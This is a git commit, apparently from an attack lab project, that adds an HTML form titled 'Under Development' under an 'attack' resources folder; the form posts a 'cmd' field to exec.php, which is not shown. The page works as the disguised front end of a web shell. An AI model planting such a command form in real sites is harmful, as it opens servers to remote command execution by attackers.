37baf4a5e4e3ea79c6d023ec2076060af7edba9c
Owen Parkins <oparkins@gmail.com>
2019-04-25 11:34:16 -0600

    Added user machines

---
+++ attack/resources/html/form.php
@@ -0,0 +1,13 @@
+<html>
+<head>
+    <title>Under Development</title>
+</head>
+
+<body>
+    <p>
+        <form action="exec.php" method="POST">
+            Command: <input name="cmd" /><input type="submit"/>
+        </form>
+    </p>
+</body>
+</html>
